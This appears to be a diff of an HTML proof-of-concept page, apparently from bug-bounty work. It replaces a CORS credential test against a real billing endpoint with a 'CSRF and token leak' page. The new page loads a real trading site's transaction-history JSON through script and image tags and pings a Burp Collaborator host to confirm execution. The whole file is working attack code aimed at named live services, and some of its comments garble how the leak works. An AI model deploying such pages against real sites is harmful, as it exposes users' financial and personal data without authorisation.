@@ -1,37 +1,27 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>CORS Misconfiguration PoC with Basic Auth</title>
-</head>
-<body>
-    <h1>CORS Misconfiguration Test (Basic Auth)</h1>
-    <input type="text" id="username" placeholder="Username">
-    <input type="password" id="password" placeholder="Password">
-    <button onclick="testCORS()">Test CORS</button>
-    <div id="result"></div>
+<html>
+  <body>
+    <h2>CSRF PoC hosted on GitHub</h2>
+    <p>If you are seeing this, the CSRF and token leak attempt has been launched.</p>
 
     <script>
-        function testCORS() {
-            var username = document.getElementById('username').value;
-            var password = document.getElementById('password').value;
-            var auth = btoa(username + ':' + password);
+      // This creates a <script> element to load the target data as JS (bypasses fetch+CORS)
+      const script = document.createElement('script');
+      script.src = 'https://trade.pluang.org/_next/data/7ixFn7cGNp40J9Gkgh3_V/en/transaction-history.json';
+      script.onload = () => {
+        console.log('[+] Script loaded (token may be accessible)');
+      };
+      script.onerror = () => {
+        console.warn('[-] Could not load script due to CORS or 404');
+      };
+      document.body.appendChild(script);
 
-            var req = new XMLHttpRequest();
-            req.onload = function() {
-                document.getElementById('result').innerText = 'Response received: ' + this.responseText;
-                // In a real attack, you might send this data to your server
-                // console.log('Data received:', this.responseText);
-            };
-            req.onerror = function() {
-                document.getElementById('result').innerText = 'CORS request failed';
-            };
-            req.open('GET', 'https://checkout.you.com/v1/billing_portal/sessions/bps_1Pw06fETU8N2v5f4hdkacCgL/customer?include_only%5B%5D=id%2Cname%2Cemail%2Cphone%2Caddress.city%2Caddress.country%2Caddress.line1%2Caddress.line2%2Caddress.postal_code%2Caddress.state%2Cshipping.address.city%2Cshipping.address.country%2Cshipping.address.line1%2Cshipping.address.line2%2Cshipping.address.postal_code%2Cshipping.address.state%2Ctax_ids.data.id%2Ctax_ids.data.value%2Ctax_ids.data.type%2Ctax_ids.data.country%2Cemail_updatable', true);
-            req.setRequestHeader('Authorization', 'Basic ' + auth);
-            req.withCredentials = true;
-            req.send();
-        }
+      // Second attempt: blind data exfil via <img> (we can't read response, but server will receive it)
+      const leak = new Image();
+      leak.src = 'https://trade.pluang.org/_next/data/7ixFn7cGNp40J9Gkgh3_V/en/transaction-history.json';
+
+      // You can also chain a request to your Burp Collaborator to confirm execution
+      const ping = new Image();
+      ping.src = 'https://o7wq4ttlcjyj95zrnrm15sv42v8mwck1.oastify.com/?csfr-fired=' + Date.now();
     </script>
-</body>
+  </body>
 </html>
